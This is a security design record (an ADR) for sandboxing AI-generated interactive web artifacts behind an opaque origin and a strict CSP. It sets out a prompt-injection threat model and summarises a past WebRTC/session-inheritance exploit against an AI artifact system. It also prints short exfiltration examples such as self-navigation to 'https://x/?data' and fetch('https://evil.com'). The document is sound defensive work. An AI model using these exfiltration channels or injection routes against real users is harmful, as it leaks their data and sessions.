# ADR-0089 — Artifact Execution Security Model (Sandbox the Execution, Don't Sanitize the Output)

**Status:** Implemented — 2026-06-07 (FRE-509 Worker CSP · FRE-510 iframe sandbox flip · FRE-511 sanitizer retirement · FRE-512 envelope-integrity verification; prod-verified `make verify-envelope` exit 0, 12/12 directives exact)
**Deciders:** Project owner
**Related:** ADR-0070 (Output Channel Model — its **D7 "documents not apps" sandbox posture is superseded here**), ADR-0069 (R2-Backed Artifact Substrate — the Worker origin + serving path this rides on), ADR-0088 (Execution Topology Observability Contract — the **observable-first done-bar this inherits**), ADR-0064 (Inbound User Identity via Cloudflare Access — the auth layer in front of the artifact origin), ADR-0063 (Primitive Tools / Action-Boundary Governance — conservative-by-default posture). **Supersedes:** the FRE-496 *strip-and-deliver* sanitizer (as a security mechanism) and the FRE-500 *flag-the-strip-off* bridge. **Ratifies + reframes:** FRE-397 (the artifact-tier thread). **Depends on (L0):** FRE-506 (gate-decision / envelope-integrity telemetry). **Adjacent (separate ADR):** FRE-497 (self-correcting deterministic gates).
**Implements:** FRE-504 (thread 5) → the new **Artifact Execution Security** pillar (L2). Spawned by FRE-508.
**Spec:** `docs/specs/SESHAT_PROGRAM_ARCHITECTURE.md` (§4 L2 — Artifact Execution Security)
**Evidence:** trace `87cbd720` / artifact `da216aa4` (decomposition first-run shipped ~33 KB of live JS to a live URL with no sanitization banner, no reject event, and **no telemetry**); `docs/research/2026-06-06-decomposition-first-run-findings.md`; code audit (cited inline)

---

## Context

### The measured problem

The 2026-06-06 decomposition first-run (trace `87cbd720`) committed artifact `da216aa4` containing **~33 KB of live JavaScript** (`<script>` + inline `onclick`) to a live URL — with **no sanitization banner, no reject event, and no telemetry** — while FRE-496 / ADR-0070 D7 supposedly *hard-fails* interactive `<script>` on the single-agent path (`tools/artifact_tools.py:1175`, `_validate_html_output`). The gate was simultaneously **inconsistent** (it fired on one path, silently let the decomposition path through) and **invisible** (it took manual forensics to discover it hadn't fired). The JS happened to be benign; nothing in the system knew that, or would have known otherwise.

### The deeper problem: the posture itself is wrong

The current posture is **sanitize-output**. The model generates JavaScript to satisfy an "interactive" request; the server tries to detect and strip it (`_SCRIPT_TAG_RE`, `_sanitize_sandbox_violations`, `artifact_tools.py:726–759`) and deliver a degraded static artifact (FRE-496 strip-and-deliver). This is wrong on three independent axes:

1. **Adversarial.** A regex sanitizer must be *complete and correct at removal* — miss one vector and it ships the danger. The code already carries the scar tissue: bad-tag-filter handling for `</script bar>` (CWE-116, CodeQL `py/bad-tag-filter`), glued `"onclick=` handlers, unterminated truncated tags. This is a treadmill, and the owner's standing position is that sanitizers are the wrong tool unless they are sophisticated programs in their own right.
2. **Lossy.** When it *works*, it degrades the artifact — the model produced an interactive teaching tool, the user receives a stripped static husk.
3. **Bypassable.** It did not even fire on the decomposition path (`da216aa4`).

The reaction to this pain was FRE-500: flag the strip **off** by default, shipping unsandboxed JS intact. That is the *opposite* failure — it trades a lossy-but-contained posture for a loud-but-uncontained one. Both are symptoms of the same root: **trying to make safety a property of the bytes instead of the container.**

### The goal

The owner needs the agent to be **free to create dynamic, interactive, visually engaging artifacts for teaching, demonstration, and learning** — and to stay secure while doing so. The reconciliation that makes both possible: **interactivity does not require the network.** Sliders, simulations, explorable diagrams, 3-D visualizers, animations, charts — all run fully client-side, self-contained, with zero outbound traffic. The security tax is paid only at the *network and session boundary*, which teaching artifacts almost never need to cross. The slogan: **free to compute, locked down to communicate.**

### What already exists (the fix is mostly a posture flip, not infrastructure)

- `artifacts.frenchforet.com` is **already a separate origin** — a Cloudflare Worker over R2, behind Cloudflare Access (ADR-0069 D2).
- `ArtifactViewer.tsx` **already loads artifacts cross-origin** in `<iframe sandbox="">` (`seshat-pwa/src/components/ArtifactViewer.tsx:182`).

The expensive part of safe interactive artifacts — an isolated origin — is built. What remains is a posture decision and a one-attribute flip, not an infrastructure project (FRE-397 reached the same conclusion).

### Threat model

| Dimension | Today | Designed-for |
|---|---|---|
| Users | Single owner | **Multi-user, dedicated trusted group** |
| Artifacts | Private (author == viewer) | **Shared within the group** (future) |
| Conversations | Private | **Stay private** |
| Edge | Cloudflare Access | unchanged |

The artifact's code is **untrusted by provenance**: it is LLM-authored and reachable by prompt injection through retrieved KG content, web-search results, or pasted text — *regardless of who requested the artifact*. The adversary is a hostile or injected artifact; the assets are (a) the viewer's authenticated session, (b) other users' private conversations behind the same Access edge, and (c) other artifacts. The shared-artifact future converts a private nuisance into **stored XSS across users** — User A's injected artifact, opened by User B, attacking B's session. Origin isolation is therefore not a nicety; **it is the control that keeps "conversations private, artifacts shared" true.**

### How the frontier labs do it (convergent prior art)

All three converge on the same shape — opaque/distinct origin + strict CSP + no arbitrary egress:

- **Claude Artifacts** — every artifact runs under a **distinct origin** from the main session with full-site process isolation; strict CSP restricts network; the opaque-origin sandbox **denies `localStorage`/`sessionStorage` outright** ("reads/writes fail silently or throw"); the only sanctioned outbound is a curated callback (`window.claude.complete()`), not open `fetch`.
- **OpenAI Apps/Canvas** — sandboxed iframe + strict CSP; `fetch` allowed only within CSP; **external domains require an explicit human-gated allowlist**; privileged APIs (`alert`/`prompt`/`confirm`/`clipboard`) blocked; subframes off by default.
- **Gemini Canvas** — sandboxed iframe + strict CSP; blocks top-level navigation, popups, and external network requests.

And the instructive failure: a 2025 exploit of Claude's artifact system showed **WebRTC signaling operating outside CSP scope** (exfil to TURN servers) and artifacts **inheriting the viewer's authenticated session** to call the vendor API as the user. Its own conclusion — *"sandboxes securing outbound channels while neglecting alternative protocols create false security boundaries"* — drives two requirements below: the egress denial must be **complete** (not just HTTP), and the artifact must **never** run with an authenticated same-origin context.

*Sources are listed under References.*

---

## Decision

### D1 — Sandbox the execution; retire the sanitizer from the security path

Security is a property of the **container** (an isolated origin with sealed egress), **not** of inspecting or filtering the bytes. The system **does not parse, strip, or reject artifact content to make a security decision.** The walls do not care what executes inside them, so we do not need to know what is inside to be safe.

The existing detection/sanitization code (`_validate_html_output`, `_sanitize_sandbox_violations`, `_SCRIPT_TAG_RE`, et al.) is **removed from the security path**. At most it survives as a cheap, best-effort *label* for analytics ("this artifact declares scripts") that **nothing depends on for safety**. Malformation checks unrelated to security (e.g. min-length, missing `</html>`) may remain as quality/usability validators, not security gates.

### D2 — One universal sealed box for every artifact

There are **no security tiers.** Every artifact — static page or heavy JavaScript — is served into the **same container**:

- **Execution isolation:** the artifact document is forced into a **unique opaque origin** by the **`sandbox` CSP directive** (`sandbox allow-scripts`, below) — a *header-only* directive that sandboxes the top-level document itself, so the opaque origin holds on **both** the embedded *and* the standalone path (D3). On the embedded path the iframe also carries `sandbox="allow-scripts"` as belt-and-suspenders (today's `sandbox=""`). The invariant to rely on: **`sandbox allow-scripts` without `allow-same-origin` gives the document no stable origin identity, so the browser denies `localStorage`, `sessionStorage`, IndexedDB, cookies, and same-origin reads, and the document cannot reach the PWA session or Access cookies.** `allow-scripts` alone does **not** lift the opaque-origin restriction; only `allow-same-origin` would, and it is never granted.
- **Network / resource lockdown (CSP):** one Content-Security-Policy, identical for every artifact, served as a Worker **response header**:

  ```
  default-src 'none';
  script-src  https://artifacts.frenchforet.com 'unsafe-inline';
  style-src   https://artifacts.frenchforet.com 'unsafe-inline';
  img-src     https://artifacts.frenchforet.com data:;
  font-src    https://artifacts.frenchforet.com data:;
  connect-src 'none';
  worker-src  'none';
  form-action 'none';
  base-uri    'none';
  frame-ancestors https://agent.frenchforet.com;
  webrtc 'block';
  sandbox allow-scripts;
  ```

  Notes on completeness (the egress must be *complete*, not just HTTP — the documented WebRTC bypass is exactly this lesson):
  - **Host-source, not `'self'`.** Because `sandbox` makes the origin opaque, the `'self'` keyword would not match the document's own (opaque) origin; an explicit host-source (`https://artifacts.frenchforet.com`) matches by URL and works regardless. (`'self'` would silently break toolkit loading.)
  - **`default-src 'none'`** is the fallback that denies the resource classes not named above — `manifest-src`, `media-src`, `prefetch`/`preconnect`/`dns-prefetch` resource hints, `object-src`, `child-src`, etc. — so they need no separate lines.
  - **`connect-src 'none'`** denies `fetch`/XHR, `WebSocket`, `EventSource`, `navigator.sendBeacon`, and `<a ping>` (CSP3). Resource hints (`prefetch`/`preconnect`/`dns-prefetch`) to **non-allowlisted** origins are denied via the `default-src 'none'` fallback (hints to the allowlisted host are not — see residual note).
  - **`webrtc 'block'`** is the correct CSP3 directive, but **browser support is uneven** — Chromium honors it; WebKit/Firefox may not, and an **unsupported CSP directive is silently ignored**, leaving `RTCPeerConnection`/STUN/TURN available. It is included as the right control where supported and treated as a **bounded residual** elsewhere (see "Two tiers of guarantee" and Consequences). It must not be claimed as a cross-browser closure.
  - **`form-action 'none'`** closes form-POST exfil. The omitted `allow-top-navigation*` sandbox flags stop an artifact from navigating the *parent* PWA, **but do not stop a script from navigating its *own* tab/frame** to an external URL (`location = 'https://x/?data'`, `<meta http-equiv=refresh>`); HTML permits a navigable to navigate itself, and no widely-supported CSP control (`navigate-to` is not dependable) blocks it. **Self-navigation is therefore a bounded residual exfil channel**, not closed here.
  - **`frame-ancestors`** names the **PWA origin** (`agent.frenchforet.com`) — **not `'self'`**, which would block the cross-origin PWA embed; it controls *who may frame the artifact* (anti-clickjacking) and is the right tool here (`frame-src` is a control for the *embedder* side, on the PWA).
  - **`worker-src 'none'`** blocks Service/Shared Workers (which would otherwise inherit `script-src` and create a persistent interception/egress surface).

**Two tiers of guarantee (state honestly):**

1. **Hard, cross-browser — the load-bearing guarantee:** an artifact has **no access to anything it was not handed** — no PWA session, no Access cookies, no `localStorage`/storage, no cross-user data, no same-origin reads. This rests on the opaque origin from `sandbox` (well-supported) and holds regardless of what runs inside.
2. **Strong but not uniformly complete — egress denial:** `fetch`/XHR/WebSocket/beacon/forms are blocked cross-browser (`connect-src`/`form-action`). **WebRTC (on browsers lacking `webrtc` support) and self-navigation remain residual channels.** Crucially, tier 1 bounds what they can leak: an artifact can only exfiltrate **what was baked into it**, never the session or another user's data. The standing operating rule that makes this acceptable is therefore **"never bake secrets into an artifact"** (see D4) — and because tier 1 means an artifact cannot *acquire* anything sensitive at runtime, this reduces to a generation-side discipline.

  `script-src https://artifacts.frenchforet.com` admits the curated self-hosted toolkit (see D2a); `'unsafe-inline'` admits the agent's own inline JS. **`'unsafe-inline'` is acceptable *here specifically*:** it is dangerous only in a network-enabled, same-origin context where it lets an injected inline script act with real privileges. In an opaque origin (tier 1) there is no session or storage to steal, and `connect-src 'none'` removes the programmatic egress an injected inline script would abuse — the whole artifact is one (untrusted) trust level, so there is no higher-trust script to protect from the inline one. `'unsafe-eval'` is **omitted** (modern toolkit libraries do not need `eval`; free hardening).

  **Sandbox capabilities deliberately *omitted*** (each omission is load-bearing): `allow-same-origin` (the opaque-origin guarantee), `allow-popups` / `allow-popups-to-escape-sandbox` (no `window.open`), `allow-top-navigation` / `allow-top-navigation-by-user-activation` (no navigating the tab to an attacker URL — the standalone navigation-exfil channel), `allow-forms`, `allow-downloads`, `allow-modals`. Only `allow-scripts` is granted.

The agent is therefore **free to build anything inside the box** — full JS, Canvas/WebGL/SVG, animation, computation — because the walls are identical regardless of what runs.

#### D2a — Curated, self-hosted toolkit (no arbitrary CDN)

Version-pinned libraries (e.g. mermaid, a charting lib, three.js) are hosted on the artifact origin (`artifacts.frenchforet.com/lib/<name>@<version>.js`). `script-src https://artifacts.frenchforet.com` keeps scripts to **our origin only** — never arbitrary internet code. **The "vetted libraries only" property is not provided by the CSP keyword alone** — a host-source admits *any* executable script the Worker serves under that host. It holds only if the Worker also: serves artifact bytes as `text/html` (never as an executable script type), serves executable JavaScript **only** from the `/lib/` path, and sets `X-Content-Type-Options: nosniff` so an artifact cannot be MIME-confused into being loaded as a script. With those Worker-side controls, the toolkit allowlist is *stronger* than CDN-allow (artifacts can run only our vetted code) and matches the frontier-lab model; **without them, it is only "scripts from our host."** These controls are part of this ADR's done-bar (D5/D7).

**Classic scripts, not ES modules.** Because the `sandbox` directive makes the document origin serialize as `null`, ES-module and some font/`fetch`-style subresource loads are subject to CORS and would require the Worker to emit `Access-Control-Allow-Origin` for a null origin. To avoid that fragility, the toolkit is delivered as **classic `<script src>`** (host-source matching, no CORS preflight); module delivery, if ever needed, must carry the appropriate CORS headers and is a curation-ticket decision.

### D3 — The CSP header is the single primary boundary on both delivery paths (tier-1 complete, tier-2 bounded)

There are two delivery paths, and the security model must hold identically on both:

- **Embedded** (in-PWA drawer): the artifact loads in an iframe.
- **Standalone** (`artifacts.frenchforet.com/{id}` opened in a tab): the artifact is a **top-level document — no iframe, therefore no `sandbox` *attribute*.**

The key realization (and the reason the standalone path is **not** weaker): the **`sandbox` CSP *directive*** is a header-only directive that sandboxes the document **itself** — top-level or framed alike. So the **CSP, served as a Worker response header on the artifact bytes** (never a `<meta>` tag — a header cannot be content-stripped, covers both paths, and `<meta>` cannot carry `sandbox`/`frame-ancestors` anyway), carries **both** the egress lockdown **and** the opaque-origin sandboxing. It is therefore the **single primary boundary present on both paths** — tier-1 complete (opaque origin) and tier-2 bounded (egress; D2). The iframe `sandbox` *attribute* on the embedded path is pure **defense-in-depth**, not load-bearing.

Design rule: **the standalone path gets the same opaque origin and egress lockdown as the embedded path, from one header.** This makes the load-bearing guarantee (no access to session/storage/cross-user data — tier 1 in D2) hold identically on both paths; it does **not** by itself close self-navigation exfil (tier 2 residual, D2/D4). Cloudflare Access in front of the origin governs *who can reach* the artifact; it does **not** constrain artifact code once loaded — the browser sandbox + CSP is the artifact-code boundary, not Access.

### D4 — Network is default-deny; egress and a model-bridge are future, flagged capabilities

`connect-src 'none'` (plus `form-action 'none'` and no popups/top-navigation; `webrtc 'block'` where supported — D2). With programmatic egress denied cross-browser, artifacts are **sealed for the channels that matter today** (the residuals — self-navigation, WebRTC-on-unsupported-browsers — are bounded by tier 1; see Honest limit). The agent is **not** given any open path to the outside world.

Two distinct sanctioned channels are named for the future — both **out of scope here**, each a flagged capability requiring its own implementation. They are ordered by preference: the model-bridge is the *narrower and safer* of the two and should be reached for first when a real need appears.

**(a) Primary-model → artifact bridge (preferred; no internet at all).** The richest "live data" source is usually **our own primary model**, not the open web — the owner's point, and the proven pattern (claude.ai's `window.claude.complete()`). Realized as a **parent-brokered `postMessage` bridge**: the embedded artifact posts a request to the PWA parent, the PWA calls the model/gateway under normal governance + identity + cost accounting, and posts the result back. This needs **no network egress from the artifact at all** (`postMessage` is a parent↔frame channel, not governed by `connect-src`; it works from an opaque-origin sandboxed iframe), so `connect-src` stays `'none'`. It is **embedded-path only** (a standalone tab has no trusted parent to broker). This keeps the artifact sealed while letting the agent feed it information on demand.

**(b) Allowlisting Worker proxy (only if a genuine external upstream is required).** When data must come from *outside* our system:
- flip `connect-src 'none'` → `connect-src https://artifacts.frenchforet.com` (host-source, not `'self'` — `'self'` is opaque under the `sandbox` directive; the artifact may address **its own origin and nowhere else**), **and**
- add a **server-side allowlisting proxy on the artifact Worker**: the artifact calls `…/proxy?url=<upstream>`; the Worker (trusted, server-side, with **no user credentials in the artifact context**) validates against an **allowlist** (never a blocklist), applies threat checks / response scanning / limits, then forwards.

The browser wall is what makes the proxy **unavoidable**: with `connect-src` restricted to our host, even a hostile artifact *cannot* `fetch` direct, so all *programmatic* egress is forced through our origin — enforcement does not depend on the agent cooperating. Ergonomics (a `seshatFetch()` toolkit helper that routes through the proxy, or a `seshatAsk()` helper over the model-bridge) are a separate layer from enforcement (the wall / the parent broker). **Open `fetch` to arbitrary origins is never permitted in either channel.**

**Honest limit — egress is bounded, never perfect, and partly *already present*:** *any* egress channel can smuggle data inside a permitted request (`GET allowed.site/<base64-secret>`); allowlisting bounds but does not eliminate this. And note the residual channels that exist **today** even with `connect-src 'none'` — self-navigation and (on unsupported browsers) WebRTC (D2 tier 2). All of these are bounded the same way: the opaque origin (D2 tier 1) means an artifact only ever holds **what the agent handed it**, so the leakable surface is the artifact's own baked-in content, never the session or another user's data. The standing rule across present residuals and any future egress is therefore the same: **never bake secrets into an artifact** (and, for the future proxy: allowlist-only, default-off, per-artifact opt-in).

### D5 — Telemetry watches envelope integrity, not content (the L0 dependency)

Because security no longer depends on a content verdict, the FRE-506 "gate decision" is reframed from content-judgment vocabulary (`pass`/`reject`/`strip`/`bypass`) to **envelope integrity**:

> Did every served artifact actually receive its walls? — CSP header present and correct, embedded with the correct `sandbox` attributes.

The alarm-worthy event is no longer "dangerous content slipped a filter" but **"an artifact was served without its CSP header"** (or with a CSP missing a required directive) — a deterministic *delivery* failure, not a guess. This ADR **depends on FRE-506** to provide that signal and **inherits ADR-0088's observable-first done-bar**: this security capability is **not shippable-to-default until its envelope decisions are observable.** "It renders" is not the bar; "every served artifact is provably wrapped, and a bare delivery is loud" is.

**Scope boundary (so D1 and D5 do not drift):** envelope telemetry records the *posture applied* (CSP header present + exact directive set, sandbox attributes, served MIME) — it **never inspects, classifies, or persists artifact bytes or generation prompts as a security verdict.** The optional analytics *label* of D1 (e.g. "declares scripts") is likewise non-load-bearing and explicitly not a gate. Security depends on the walls; telemetry observes whether the walls were applied — neither judges content.

### D6 — Designed for shared-multi-user; opaque origin on both paths is day-one, not gated

Because the `sandbox` CSP directive (D2/D3) yields an opaque origin on **both** the embedded and standalone paths from day one, the cross-user invariants that the shared-artifact future needs are satisfied **now**, at no extra cost for the single-user present:

- **No same-origin authority** to the PWA session or Access cookies — so a shared, possibly-injected artifact opened by another user cannot act as that user or read their private conversations. (Cloudflare Access being `HttpOnly` is **not** the argument — `HttpOnly` cookies are still *sent* by the browser on navigations/subresource requests; the actual guarantee is the opaque-origin sandbox + `connect-src 'none'` + the omitted navigation flags, which mean such requests cannot be *made* and carry no exfil.)
- **No shared storage between artifacts** — the opaque origin denies `localStorage`/IndexedDB/cookies on *both* paths, so the cross-artifact storage channel that a shared real origin would create simply does not exist. There is therefore **no standalone-hardening gate to clear before sharing.**

What remains genuinely out of scope: artifact **sharing mechanics** (permissions, visibility, the group model) — a separate ADR. This ADR fixes only the **security invariants** that make sharing safe to build. **Per-artifact subdomains** (`{id}.artifacts.frenchforet.com`) are named as a *future* option **only if** persistent, per-artifact server-side storage is ever introduced (stateful artifacts) — at which point opaque origins no longer suffice to isolate artifacts from each other. Until that exists, they are unnecessary.

### D7 — Supersession and scope boundaries

- **Supersedes ADR-0070 D7** ("documents not apps; `sandbox=""` by default; interactivity needs an ADR amendment"). This *is* that amendment, generalized: the default is now a sealed, script-capable box. ADR-0070 D1–D6 (the channel model, the artifact-card UX) are unchanged.
- **Supersedes the FRE-500 bridge.** FRE-500 flagged the strip *off* as a temporary measure; this model removes the strip-as-security entirely and replaces it with the sandbox, so the bridge's re-enable condition (FRE-397 Tier-2) is satisfied by this ADR.
- **FRE-397 is ratified and reframed.** Its owner-approved direction (interactive JS via the already-isolated origin; curated self-hosted toolkit, here refined to a host-source `script-src` per D2a) is adopted. Its **"tiers" are reframed**: static-vs-script is *not* a security distinction (one box covers both). What remains of "tiers" is an optional **portability** axis — server-rendering a diagram to inline SVG makes an artifact *self-contained and portable* ("travels with the file") versus a hosted JS artifact ("view-on-origin only") — a **product/generator** choice, not a second sandbox.
- **FRE-497 (self-correcting gates) is adjacent, not absorbed.** Under sandboxing, `<script>` is no longer a rejection, so the *artifact-script* gate that seeded FRE-497 dissolves. FRE-497's pattern remains relevant for *other* deterministic, model-correctable gates (malformed HTML, plan-cap) and is decided in its own ADR.

---

## Consequences

### Positive

- **The agent gets near-total creative freedom** inside a box that is safe **once the walls are correctly deployed and verified** (D5/D7) — the teaching/learning goal is met without an adversarial fight over content.
- **No sanitizer treadmill.** The fragile, CWE-116-prone regex strip leaves the security path; safety stops depending on enumerating every dangerous construct.
- **One model, no tiers.** Static and interactive artifacts share one container and one rule set — simpler to reason about, implement, and audit.
- **The production failure is closed in two ways:** the sandbox makes the 33 KB-of-JS case *safe* rather than *stripped*, and envelope-integrity telemetry makes a missing wall *loud* rather than a forensic surprise.
- **FRE-499 is closed by the same envelope** — `connect-src 'none'` + `img-src` host-source blocks the remote-resource leak (`<img src=remote>`, `@import`, `url()`) for *every* artifact, static included, at one enforcement point instead of per-vector regexes (conditional on the CSP being served, per D5).
- **Forward-compatible.** Live data is a named, flagged extension point, not a dead end — a parent-brokered model-bridge (no egress) or a known `connect-src` host-source flip + Worker proxy, not a re-architecture (D4).

### Negative / tradeoffs

- **`'unsafe-inline'` in `script-src`** looks alarming out of context and will draw security-scanner flags; the ADR must carry the justification (D2) so it is not "fixed" into a nonce scheme that buys nothing here.
- **Residual risks the model does *not* eliminate** (and which no containment-based artifact model can): **self-navigation exfil** (a script navigating its own tab/frame to an external URL — bounded by tier 1 to artifact-visible/baked-in data, D2/D4); **WebRTC on browsers lacking the `webrtc` directive** (same bound); **deceptive / phishing UI** (the opaque origin prevents data theft but not visual spoofing — an artifact can *render* a convincing fake login; it cannot submit it anywhere); **UI-redressing / clickjacking of the artifact** (mitigated by `frame-ancestors`); and **resource abuse** (CPU/memory exhaustion, timing side-channels — CSP imposes no resource limits; bounded only by "close the tab"). All are named, accepted, and bounded by tier 1 + the "no secrets in artifacts" rule; none are in scope to eliminate here.
- **The boundary is only as good as its deployment.** The opaque origin, complete egress denial, and curated-toolkit property all depend on the exact CSP, the Worker MIME/route controls (D2a), and the served-response verification (D5/D7) actually being in place — not on intent. A partial deployment is a partial boundary.
- **Cross-repo seam.** The CSP response header and the Worker MIME/route controls live in the Cloudflare Worker, which is **not in this repo** (infra/secrets repo). Implementation requires coordinated changes across both; the done-bar (D5/D7) must verify the header in the *served* response, not just intend it in code.
- **Egress, when it eventually lands, is a bounded-not-perfect control** (D4) — this must be stated in that future ticket, not implied away by "we have an allowlist."
- **Portability vs interactivity is a real user-facing tradeoff** (SVG travels, JS is view-on-origin) that the generator now has to choose between — surfaced, not hidden.

### Neutral

- **ADR-0070's artifact-card UX, channel model, and replay-cost discipline are unchanged** — only D7's sandbox posture is replaced.
- **Mermaid→inline-SVG (FRE-396)** continues to work and is now framed as the *portability* lane, not a security tier.
- **The CLI** is unaffected — it prints the artifact URL; the sandbox is a browser concern.

---

## Alternatives Considered

### A. Keep sanitize-output (strip-and-deliver, FRE-496)
*Rejected.* Adversarial, lossy, and bypassable — and it failed in production (`da216aa4`). Security-by-content-inspection requires the sanitizer to be complete and correct forever; the wrong primitive.

### B. Tiered sandboxes (FRE-397 Tier 0/1/2 as distinct security postures)
*Rejected as a security model.* Once the box is sealed (opaque origin + `connect-src 'none'`), "static vs script" is **not** a security distinction — a static page in a script-capable box is just an artifact that happens not to run scripts, and the walls are identical. Collapsing to one box is simpler and equally safe. The tier idea survives only as a *portability* optimization and an optional analytics label.

### C. Allow CDN / external scripts (`script-src https:` or a CDN allowlist)
*Rejected.* A curated, version-pinned, self-hosted toolkit (host-source `script-src` + the D2a Worker controls) is strictly stronger (artifacts can only run *our* vetted code) and matches the frontier-lab model. CDN-Mermaid and friends are unnecessary once the toolkit is hosted.

### D. Per-artifact subdomains now (`{id}.artifacts.frenchforet.com`)
*Deferred, not rejected.* The `sandbox` CSP directive already denies cross-artifact storage on both paths (D6), so per-artifact origins are **not** needed for the shared-artifact future as such. They become relevant only if **persistent, per-artifact server-side storage** (stateful artifacts) is ever introduced — at which point opaque origins no longer isolate artifacts from each other. Named in D6 as that future option.

### E. Blocklist egress / "block known-harmful sites"
*Rejected.* A blocklist leaves everything-not-listed reachable, which for exfil means everything is reachable; harmful destinations cannot be enumerated. Egress (D4, future) is **allowlist-only and default-off.**

### F. Transparent egress proxy that reroutes arbitrary destinations
*Clarified, not adopted.* The browser cannot transparently intercept a `fetch('https://evil.com')` and reroute it while keeping the box sealed. The realizable form is D4(b): the wall (`connect-src` host-source) forces traffic through *our* origin, and the proxy is reached as our own endpoint. That *is* the proxy model — and it is future + flagged.

### G. Keep `connect-src` open and rely on the proxy to filter
*Rejected.* Filtering at an open egress is the blocklist trap (E) and the WebRTC-bypass trap. Default-deny at the wall, with the proxy as the single permitted hole, is the only posture that holds against an injected artifact.

---

## Implementation Pointers

Realized across this repo and the Worker (infra) repo; sequenced in the implementation tickets (filed Needs Approval under the new pillar project):

- **Worker (infra repo) — the primary boundary:** emit the **exact D2 CSP as a response header** on every artifact GET (both embedded and standalone), including `sandbox allow-scripts`, `webrtc 'block'`, host-source lists, and `frame-ancestors https://agent.frenchforet.com`; serve artifact bytes as `text/html` and executable JS **only** from `/lib/`; set `X-Content-Type-Options: nosniff`; host the curated version-pinned `/lib/<name>@<version>.js` toolkit.
- **PWA:** `ArtifactViewer.tsx:182` — `sandbox=""` → `sandbox="allow-scripts"` (never `allow-same-origin`) as defense-in-depth; keep `referrerPolicy="no-referrer"`.
- **Artifact tools (`tools/artifact_tools.py`):** remove `_validate_html_output` / `_sanitize_sandbox_violations` from the security path; retire the FRE-496/FRE-500 strip-and-flag machinery; retain only non-security malformation checks; reduce any content inspection to an optional, non-load-bearing label.
- **Telemetry (FRE-506):** record the envelope applied per artifact serve, and alarm on a CSP-absent or directive-incomplete serve (D5) — observing the served response, not the source.
- **Generation prompt (`_HTML_GENERATION_SYSTEM_PROMPT`):** stop forbidding `<script>`; instead steer the **portability** choice (inline SVG for diagrams that should travel vs JS for genuine interactivity) and document the sealed-box constraints (no network, no storage).

## Verification

- **Tier 1 (hard, both paths):** an artifact containing `<script>` and `onclick` **renders and runs** both in the drawer **and** opened standalone, yet in **both** cases **cannot** read the parent session, **cannot** use `localStorage`/IndexedDB/cookies, and **cannot** read another user's data (opaque origin via the `sandbox` directive — verify on Chromium *and* WebKit/iOS).
- **Tier 2 (egress, cross-browser parts):** `connect-src 'none'` denies fetch/XHR/WebSocket/EventSource/beacon/`<a ping>`; `form-action 'none'` denies form-POST; `worker-src 'none'` denies Service/Shared Workers; `default-src 'none'` denies resource hints and `media-src`/`manifest-src` to non-allowlisted origins — confirm each blocked (FRE-499 closed).
- **Tier 2 residuals (confirm the *bound*, not closure):** verify that `RTCPeerConnection` is blocked where `webrtc` is supported and **document** that it is open where unsupported; verify that self-navigation (`location=`/`<meta refresh>`) can still reach an external URL but carries **only artifact-visible data** (tier 1 holds) — i.e. the failure mode is bounded, not absent.
- The served artifact response carries the **exact D2 CSP header (all directives) on both paths**; a serve without it, or missing a directive, is **flagged in telemetry** (D5) — verified against the *served response*, not the source.
- `frame-ancestors https://agent.frenchforet.com` **permits the PWA embed** and refuses any other embedder — confirm the drawer still loads while a foreign embed is refused.
- The Worker serves artifact bytes as `text/html` with `nosniff` and classic toolkit JS only from `/lib/`; an attempt to load an artifact URL as a `<script>` fails (curated-toolkit property, D2a).
- No code path makes a *security* decision by inspecting artifact bytes (grep: the sandbox/CSP, not the regex, is the boundary).

## Open decisions (settle in implementation tickets / future ADRs)

- **Toolkit contents and versioning policy** (which libraries, update cadence, pinning) — a curation ticket.
- **Live data** (D4): the **preferred** parent-brokered model-bridge (`postMessage` → PWA → gateway, no egress) and/or the allowlisting Worker proxy (destination allowlist shape, threat-checks, per-artifact opt-in, "no secrets in egress-enabled artifacts") — a dedicated future ADR when a concrete use case exists.
- **Per-artifact subdomains** (D6/Alt-D): only if persistent per-artifact server-side storage (stateful artifacts) is ever introduced.

*Settled in this ADR:* sandbox-not-sanitize, no content inspection for security (D1); one universal sealed box + the exact CSP incl. `sandbox`/`webrtc`/host-source/`frame-ancestors`/`worker-src` (D2); the CSP header is the single primary boundary on **both** paths — tier-1 complete, tier-2 bounded, opaque origin standalone too (D3); network default-deny, live data a flagged future via the preferred parent-brokered model-bridge (no egress) or a `connect-src` host-source flip + allowlisting proxy (D4); envelope-integrity telemetry (not content verdicts) under ADR-0088's done-bar, incl. served-response CSP/MIME tests (D5); shared-multi-user invariants satisfied **day-one**, sharing *mechanics* deferred to a separate ADR (D6); supersession of ADR-0070 D7 + the FRE-500 bridge, FRE-397 ratified-and-reframed (D7).

## References

- Spec: `docs/specs/SESHAT_PROGRAM_ARCHITECTURE.md` (§4 L2 Artifact Execution Security, §7 sequencing caveat — policy designable in parallel, *enforcement/validation* depends on L0 FRE-506)
- Research: `docs/research/2026-06-06-decomposition-first-run-findings.md` (trace `87cbd720`, artifact `da216aa4`)
- Code: `tools/artifact_tools.py:726–759,1140–1180,1460–1510`; `seshat-pwa/src/components/ArtifactViewer.tsx:182`
- ADRs: ADR-0070 (D7 superseded), ADR-0069 (Worker origin), ADR-0088 (done-bar), ADR-0064 (Access), ADR-0063
- Linear: FRE-504 (origin), FRE-508 (this ADR), FRE-397 (ratified/reframed), FRE-496 (superseded), FRE-499 (closed by the D2/D3 CSP), FRE-500 (bridge superseded), FRE-506 (L0 telemetry dep), FRE-497 (adjacent — separate ADR)
- Prior art: [Anthropic — How we contain Claude](https://www.anthropic.com/engineering/how-we-contain-claude) · [Simon Willison — AI-powered apps with Claude](https://simonwillison.net/2025/Jun/25/ai-powered-apps-with-claude/) · [Claude Artifacts guide (storage denial)](https://www.shareduo.com/blog/claude-artifacts) · [OpenAI Apps SDK — Security & Privacy](https://developers.openai.com/apps-sdk/guides/security-privacy) · [Reverse-engineering the ChatGPT Apps iframe sandbox](https://dev.to/infoxicator/i-reverse-engineered-chatgpt-apps-iframe-sandbox-2ok3) · [sobele.com — Bulk Exploitation of Verified Users in the Claude.ai Artifact System](https://www.sobele.com/en/blogs/security-breach-analysis/bulk-exploitation-of-verified-users-in-the-claudeai-artifact-system)
